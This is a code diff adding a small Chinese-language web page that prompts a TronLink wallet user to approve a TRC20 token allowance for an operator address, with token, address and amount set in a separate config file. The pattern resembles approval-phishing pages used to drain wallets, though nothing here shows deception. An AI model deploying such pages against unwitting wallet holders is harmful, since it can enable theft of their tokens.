@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <title>TRC20 授权页面</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+  <script src="config.js"></script>
+</head>
+<body>
+  <h2>点击按钮授权您的 TRC20 Token</h2>
+  <button onclick="authorize()">授权给操作合约</button>
+  <p id="status"></p>
+
+  <script>
+    async function authorize() {
+      const statusEl = document.getElementById('status');
+      
+      if (!window.tronWeb || !tronWeb.defaultAddress.base58) {
+        statusEl.innerText = "请先安装并登录 TronLink 钱包";
+        return;
+      }
+
+      try {
+        const tokenContract = await tronWeb.contract(TRC20_ABI, TOKEN_ADDRESS);
+        const result = await tokenContract
+          .approve(OPERATOR_ADDRESS, tronWeb.toSun(APPROVE_AMOUNT))
+          .send();
+
+        statusEl.innerText = `✅ 授权成功！交易哈希: ${result}`;
+      } catch (e) {
+        statusEl.innerText = `❌ 授权失败: ${e.message}`;
+      }
+    }
+  </script>
+</body>
+</html>
